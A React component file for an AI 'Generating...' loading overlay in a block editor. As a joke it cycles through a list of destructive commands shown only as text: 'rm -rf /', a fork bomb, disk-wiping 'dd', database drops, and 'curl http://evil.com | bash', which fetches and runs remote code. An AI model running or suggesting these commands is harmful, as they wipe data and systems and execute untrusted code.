import { useEffect, useLayoutEffect, useState } from "react";
import { Spinner } from "@heroui/react";

const loadingMessages = [
  "rm -rf /",
  "DROP TABLE users;",
  "chmod 777 /",
  "sudo rm -rf --no-preserve-root /",
  "DELETE FROM production WHERE 1=1;",
  "git push --force origin main",
  "curl http://evil.com | bash",
  "dd if=/dev/zero of=/dev/sda",
  ":(){ :|:& };:",
  "TRUNCATE TABLE customers CASCADE;",
  "echo '' > /etc/passwd",
  "npm install is-odd is-even is-thirteen",
  "while true; do fork; done",
  "alias cd='rm -rf'",
  "mv / /dev/null",
  "kubectl delete namespace production",
  "UPDATE accounts SET balance = 0;",
  "git checkout --orphan empty && git push -f",
  "iptables -F && iptables -X",
  "echo 'Generating... jk mining crypto'",
  "SELECT * FROM users; -- just looking",
  "sudo chmod -R 000 /",
  "cat /dev/urandom > /dev/sda",
  "crontab -r",
  "systemctl stop everything",
  "mongo --eval 'db.dropDatabase()'",
  "redis-cli FLUSHALL",
  "rm ~/.ssh/authorized_keys",
  "echo 'alias ls=rm' >> ~/.bashrc",
  "pkill -9 -u $(whoami)",
];

interface AILoadingOverlayProps {
  blockId: string;
  editor: any;
  status: "loading" | "cancelled";
}

export function AILoadingOverlay({ blockId, editor, status }: AILoadingOverlayProps) {
  const [position, setPosition] = useState<{ top: number; left: number; width: number } | null>(null);
  const [messageIndex, setMessageIndex] = useState(() =>
    Math.floor(Math.random() * loadingMessages.length)
  );

  // Position the overlay below the prompt block
  useLayoutEffect(() => {
    const updatePosition = () => {
      if (!editor?.domElement) return;

      const blockEl = editor.domElement.querySelector(`[data-id="${blockId}"]`);
      if (!blockEl) return;

      // Get the .editor scroll container (which has position: relative)
      const scrollContainer = editor.domElement.closest(".editor");
      if (!scrollContainer) return;

      const blockRect = blockEl.getBoundingClientRect();
      const containerRect = scrollContainer.getBoundingClientRect();

      // Position relative to the scroll container
      // blockRect.bottom gives us viewport position, subtract container top to get relative position
      // Add scrollTop to account for scroll offset
      setPosition({
        top: blockRect.bottom - containerRect.top + scrollContainer.scrollTop + 4,
        left: blockRect.left - containerRect.left,
        width: blockRect.width,
      });
    };

    updatePosition();

    // Update on scroll and resize
    const scrollContainer = editor?.domElement?.closest(".editor");
    scrollContainer?.addEventListener("scroll", updatePosition);
    window.addEventListener("resize", updatePosition);

    return () => {
      scrollContainer?.removeEventListener("scroll", updatePosition);
      window.removeEventListener("resize", updatePosition);
    };
  }, [blockId, editor]);

  // Cycle through messages
  useEffect(() => {
    if (status !== "loading") return;

    const interval = setInterval(() => {
      setMessageIndex((prev) => (prev + 1) % loadingMessages.length);
    }, 800);

    return () => clearInterval(interval);
  }, [status]);

  if (!position) return null;

  if (status === "cancelled") {
    return (
      <div
        className="absolute z-20 flex items-center gap-2 py-3 px-4 rounded-lg bg-default-100 border border-default-200 text-default-400 italic select-none"
        style={{ top: position.top, left: position.left, width: position.width }}
      >
        <span>Cancelled</span>
      </div>
    );
  }

  return (
    <div
      className="absolute z-20 flex items-center gap-3 py-3 px-4 rounded-lg bg-default-100 border border-default-200 select-none"
      style={{ top: position.top, left: position.left, width: position.width }}
    >
      <Spinner size="sm" color="default" />
      <span className="text-default-500 text-sm">
        Generating...
        <span className="ml-2 text-default-400 font-mono text-xs opacity-60 animate-pulse">
          {loadingMessages[messageIndex]}
        </span>
      </span>
    </div>
  );
}
